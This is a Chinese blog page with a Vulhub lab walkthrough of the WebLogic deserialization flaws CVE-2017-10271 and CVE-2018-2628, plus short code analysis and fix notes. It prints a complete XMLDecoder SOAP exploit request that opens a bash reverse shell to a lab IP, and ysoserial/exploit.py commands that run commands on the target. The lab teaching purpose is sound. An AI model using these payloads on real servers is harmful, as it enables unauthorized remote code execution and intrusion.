@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wuyaxiao.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"posthide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="相关知识点总结参考https:&#x2F;&#x2F;j7ur8.github.io&#x2F;WebBook&#x2F;Java&#x2F;Java%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80.html 相关知识点 HTTP：https:&#x2F;&#x2F;developer.mozilla.org&#x2F;zh-CN&#x2F;docs&#x2F;Web&#x2F;HTTP  环境搭建https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_40228200&#x2F;arti">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习小屋">
+<meta property="og:url" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="学习小屋">
+<meta property="og:description" content="相关知识点总结参考https:&#x2F;&#x2F;j7ur8.github.io&#x2F;WebBook&#x2F;Java&#x2F;Java%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80.html 相关知识点 HTTP：https:&#x2F;&#x2F;developer.mozilla.org&#x2F;zh-CN&#x2F;docs&#x2F;Web&#x2F;HTTP  环境搭建https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_40228200&#x2F;arti">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161137665.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161223777.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161246840.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161438858.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161507000.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161612665.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251103222137817.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251103222211080.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251104214436871.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109155806335.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109155753738.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109155858163.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109172233714.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109172147147.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109172722816.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109173218623.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109174752756.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109173743592.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109174824245.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109171526856.png">
+<meta property="article:published_time" content="2025-09-23T08:25:48.667Z">
+<meta property="article:modified_time" content="2025-11-12T00:27:38.146Z">
+<meta property="article:author" content="wuyaxiao">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161137665.png">
+
+<link rel="canonical" href="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | 学习小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">学习小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wuyaxiao.github.io/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wuyaxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-09-23 16:25:48" itemprop="dateCreated datePublished" datetime="2025-09-23T16:25:48+08:00">2025-09-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-11-12 08:27:38" itemprop="dateModified" datetime="2025-11-12T08:27:38+08:00">2025-11-12</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>相关知识点总结参考<a target="_blank" rel="noopener" href="https://j7ur8.github.io/WebBook/Java/Java%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80.html">https://j7ur8.github.io/WebBook/Java/Java%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80.html</a></p>
+<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><ul>
+<li>HTTP：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP</a></li>
+</ul>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40228200/article/details/126419237">https://blog.csdn.net/weixin_40228200/article/details/126419237</a></p>
+<h1 id="Weblogic-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者利用服务器的XMLDecoder可以解析XML数据这一特性，可以构造XML语句，上传一句话木马，getshell。</p>
+<h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><h3 id="2-1-环境搭建"><a href="#2-1-环境搭建" class="headerlink" title="2.1 环境搭建"></a>2.1 环境搭建</h3><table>
+<thead>
+<tr>
+<th align="center">系统</th>
+<th align="center">脚本</th>
+<th align="center">工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">kali(2023)</td>
+<td align="center">CVE-2017-10271</td>
+<td align="center">docker</td>
+</tr>
+</tbody></table>
+<p>启动环境</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161137665.png" alt="image-20251102161137665"></p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161223777.png" alt="image-20251102161223777"></p>
+<p>访问&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161246840.png" alt="image-20251102161246840"></p>
+<h3 id="2-2-漏洞验证"><a href="#2-2-漏洞验证" class="headerlink" title="2.2 漏洞验证"></a>2.2 漏洞验证</h3><p>构造payload<code>/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.186.128/9999 0&gt;&amp;1&quot;</code>,发送如下数据包</p>
+<blockquote>
+<p>注意其中反弹shell的语句<code>/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.186.128/9999 0&gt;&amp;1&quot;</code>，需要进行实体编码，否则解析XML的时候将出现格式错误</p>
+<p>原因在于 XML 的特殊字符：</p>
+<table>
+<thead>
+<tr>
+<th><strong>字符</strong></th>
+<th><strong>XML 中的含义</strong></th>
+<th><strong>冲突原因</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>&gt;</code></strong> (大于号)</td>
+<td>用于标记 XML 标签的<strong>结束</strong> (<code>&lt;/tag&gt;</code>)</td>
+<td>在命令中，它用于<strong>重定向</strong> (<code>&gt;&amp;</code>)</td>
+</tr>
+<tr>
+<td><strong><code>&amp;</code></strong> (和号)</td>
+<td>用于标记 XML 实体 (如 <code>&amp;</code>)</td>
+<td>在命令中，它用于<strong>重定向</strong> (<code>&gt;&amp;</code> 和 <code>0&gt;&amp;1</code>)</td>
+</tr>
+</tbody></table>
+<p>如果不编码，XML 解析器会认为 <code>&lt;string&gt;bash -i &gt;&amp; /dev/tcp...&lt;/string&gt;</code> 结构中，<code>&gt;</code> 和 <code>&amp;</code> 是 XML 语法的一部分，从而导致解析失败。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.186.128:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 644</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.186.128/9999 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<p>nc监听</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161438858.png" alt="image-20251102161438858"></p>
+<p>获取shell</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161507000.png" alt="image-20251102161507000"></p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251102161612665.png" alt="image-20251102161612665"></p>
+<h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3 漏洞分析"></a>3 漏洞分析</h2><p>此次漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求。</p>
+<p>首先看到weblogic.wsee.jaxws.workcontext.WorkContextServerTube类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> NextAction <span class="title function_">processRequest</span><span class="params">(Packet var1)</span> &#123;</span><br><span class="line">   <span class="built_in">this</span>.isUseOldFormat = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">if</span>(var1.getMessage() != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">HeaderList</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getMessage().getHeaders();</span><br><span class="line">      <span class="type">Header</span> <span class="variable">var3</span> <span class="operator">=</span> var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">if</span>(var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="built_in">this</span>.readHeaderOld(var3);<span class="comment">//如果存在老版本头部则进入危险的反序列话过程</span></span><br><span class="line">         <span class="built_in">this</span>.isUseOldFormat = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">Header</span> <span class="variable">var4</span> <span class="operator">=</span> var2.get(<span class="built_in">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">if</span>(var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="built_in">this</span>.readHeader(var4);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">readHeaderOld</span><span class="params">(Header var1)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">/* 所有通过var5写入的XML数据会直接输出到var4的字节数组中 */</span></span><br><span class="line">      <span class="comment">/* 1. 从XMLStreamReader var2读取原始XML数据*/</span></span><br><span class="line">      <span class="comment">/* 2. 通过XMLStreamWriter var5将结构化XML序列化为字节流写入缓冲区var4*/</span></span><br><span class="line">      <span class="comment">/* 3. 创建了一个 WorkContextXmlInputAdapter 适配器对象，它包装了 var4 中的 XML 数据*/</span></span><br><span class="line">      <span class="type">XMLStreamReader</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readHeader();</span><br><span class="line">      var2.nextTag();</span><br><span class="line">      var2.nextTag();</span><br><span class="line">      <span class="type">XMLStreamReaderToXMLStreamWriter</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLStreamReaderToXMLStreamWriter</span>();</span><br><span class="line">      <span class="type">ByteArrayOutputStream</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">      <span class="type">XMLStreamWriter</span> <span class="variable">var5</span> <span class="operator">=</span> XMLStreamWriterFactory.create(var4);</span><br><span class="line">      var3.bridge(var2, var5);</span><br><span class="line">      var5.close();</span><br><span class="line">      <span class="type">WorkContextXmlInputAdapter</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkContextXmlInputAdapter</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var4.toByteArray()));</span><br><span class="line">      <span class="built_in">this</span>.receive(var6);<span class="comment">//触发反序列化 - 不停跟进就会发现调用了xmlDecoder.readObject方法</span></span><br><span class="line">   &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var7);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var8);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-漏洞修复"><a href="#4-漏洞修复" class="headerlink" title="4 漏洞修复"></a>4 漏洞修复</h2><ol>
+<li>临时解决方案 根据业务所有需求，考虑是否删除WLS-WebServices组件。</li>
+<li>官方补丁修复 前往Oracle官网下载10月份所提供的安全补丁。</li>
+</ol>
+<h1 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h1><h2 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h2><p>CVE-2018-2628为CVE-2017-3248修复版本的绕过，远程攻击者可利用该漏洞在未授权的情况下发送攻击数据，通过T3协议在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议达到执行任意反序列化 payload 的目的。</p>
+<h2 id="2-漏洞复现-1"><a href="#2-漏洞复现-1" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>环境搭建</p>
+<table>
+<thead>
+<tr>
+<th align="center">系统</th>
+<th align="center">脚本</th>
+<th align="center">工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">kali(2023)</td>
+<td align="center">CVE-2018-2628</td>
+<td align="center">docker</td>
+</tr>
+</tbody></table>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251103222137817.png" alt="image-20251103222137817"></p>
+<p>环境启动后，访问<code>http://your-ip:7001/console</code>，即可看到后台登录页面。</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251103222211080.png" alt="image-20251103222211080"></p>
+<p>下载<code>ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br></pre></td></tr></table></figure>
+
+<p>执行以下命令（payload可以更改）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 <span class="string">&#x27;touch /tmp/1111&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251104214436871.png" alt="image-20251104214436871"></p>
+<blockquote>
+<p>存在漏洞的Java应用 → 连接到攻击者的 8888 端口<br>    ↓<br>触发反序列化漏洞，执行恶意命令<br>    ↓<br>目标机器执行: touch &#x2F;tmp&#x2F;1111</p>
+</blockquote>
+<p>然后，使用<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">exploit.py</a>脚本，向目标Weblogic（<code>http://your-ip:7001</code>）发送数据包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span></span><br><span class="line">python2 exploit.py 192.168.186.128 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.186.128 8888 JRMPClient2 <span class="comment">#Using java.rmi.activation.Activator</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109155806335.png" alt="image-20251109155806335"></p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109155753738.png" alt="image-20251109155753738"></p>
+<p>行<code>docker compose exec weblogic bash</code>进入容器中，可见&#x2F;tmp&#x2F;1111已成功创建。</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109155858163.png" alt="image-20251109155858163"></p>
+<h2 id="3-漏洞分析-1"><a href="#3-漏洞分析-1" class="headerlink" title="3 漏洞分析"></a>3 漏洞分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只在反序列化Proxy时检查：取消代理proxy，不走resolveProxyClass，而去走resolveClass就可以绕过</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            String[] arr$ = interfaces;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">intf</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">                <span class="comment">// 只判断了java.rmi.registry.Registry：找一个其他的rmi接口即可绕过，比如java.rmi.activation.Activator。</span></span><br><span class="line">                <span class="keyword">if</span> (intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br></pre></td></tr></table></figure>
+
